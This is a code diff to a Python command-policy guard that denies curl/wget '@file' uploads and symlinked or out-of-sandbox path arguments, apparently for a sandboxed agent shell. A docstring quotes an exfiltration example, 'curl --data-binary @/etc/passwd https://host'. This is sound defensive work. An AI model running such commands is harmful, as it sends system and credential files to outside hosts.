@@ -24,8 +24,11 @@ from pathlib import Path
 from typing import Any
 
 from .models import Decision, Limits, PolicyResult
+from .paths import inspect_argument_path
 
 URL_RE = re.compile(r"^([A-Za-z][A-Za-z0-9+.\-]*)://")
+# curl/wget read local files through value syntax: -d @file, -F name=@file, -F name=<file, --data-urlencode name@file
+FILE_REF_RE = re.compile(r"=[@<]")
 OPERATOR_CHARS = frozenset("|&;<>()")
 
 
@@ -288,8 +291,11 @@ class CommandPolicy:
                 f"'{prog} {argv[1]}' is not allowed (allowed: {', '.join(allowed_subs)})",
             ), False
 
-        for arg in argv[1:]:
+        for index, arg in enumerate(argv[1:]):
+            previous = argv[index] if index > 0 else ""
             result = self._check_arg(arg)
+            if result is None and prog in self.downloaders:
+                result = self._check_file_reference(prog, arg, previous)
             if result:
                 return result, False
         return None, not known
@@ -323,6 +329,15 @@ class CommandPolicy:
         return None
 
     def _check_value(self, value: str) -> PolicyResult | None:
+        """Check one candidate value.
+
+        Every value is treated as a possible sandbox-relative path, bare names included: the
+        guard cannot tell ``cat link`` (a file) from ``echo link`` (a word), and the cost of
+        guessing wrong is reading or overwriting a file outside the sandbox. A value is
+        therefore resolved against the sandbox exactly as the kernel would, and refused if it
+        escapes the sandbox or passes through any symlink. URLs (http/https) are the only
+        values that are not paths. Plain words that do not name an existing file simply pass.
+        """
         match = URL_RE.match(value)
         if match:
             scheme = match.group(1).lower()
@@ -330,7 +345,7 @@ class CommandPolicy:
                 return _deny("bad-url-scheme", f"URL scheme '{scheme}://' is not allowed")
             return None
 
-        if not ("/" in value or value.startswith("~") or value == ".."):
+        if not value:
             return None
         if value.startswith("~"):
             return _deny("argument-outside-sandbox", f"home-directory reference is not allowed: {value}")
@@ -338,12 +353,52 @@ class CommandPolicy:
             return _deny("system-path", f"dangerous command (touches a system path: {value})")
         if posixpath.isabs(value):
             return _deny("argument-outside-sandbox", f"absolute paths are not allowed: {value}")
-        try:
-            resolved = (self.sandbox_root / value).resolve()
-        except (OSError, RuntimeError):
-            return _deny("argument-outside-sandbox", f"cannot resolve path argument: {value}")
-        if not resolved.is_relative_to(self.sandbox_root):
-            return _deny("argument-outside-sandbox", f"path argument escapes the sandbox: {value}")
+
+        problem = inspect_argument_path(self.sandbox_root, value)
+        if problem is None:
+            return None
+        kind, part = problem
+        if kind == "symlink":
+            return _deny("symlink-argument", f"argument passes through a symlink ({part}): {value}")
+        return _deny("argument-outside-sandbox", f"path argument escapes the sandbox: {value}")
+
+    def _check_file_reference(self, prog: str, arg: str, previous: str) -> PolicyResult | None:
+        """Deny curl/wget ``@file`` style references that point outside the sandbox or through a symlink.
+
+        ``curl --data-binary @/etc/passwd https://host`` reads a local file named *inside* the
+        value, which the plain argument check cannot see. The referenced path gets the same
+        treatment as any other argument. A reference to an ordinary file inside the sandbox
+        stays allowed (and, like every curl, needs approval): see "exfiltration" in
+        THREAT_MODEL.md.
+        """
+        if arg.startswith("--"):
+            option, _, value = arg.partition("=")
+        elif arg.startswith("-"):
+            option, value = arg[:2], arg[2:]  # glued short option: -d@file
+        else:
+            option, value = previous, arg
+
+        reference: str | None = None
+        if value.startswith("@"):
+            reference = value[1:]
+        else:
+            found = FILE_REF_RE.search(value)
+            if found:
+                reference = value[found.end() :]
+            elif option == "--data-urlencode" and "@" in value:
+                reference = value.split("@", 1)[1]  # name@file
+        if reference is None:
+            return None
+
+        reference = reference.split(";", 1)[0].strip("\"'")  # -F 'f=@"a b.txt";type=text/plain'
+        if not reference or reference == "-":
+            return None
+        denied = self._check_value(reference)
+        if denied:
+            return _deny(
+                "file-reference",
+                f"dangerous command ({prog} reads a file through @file syntax: {denied.reason})",
+            )
         return None
 
     def _is_system_path(self, value: str) -> bool:
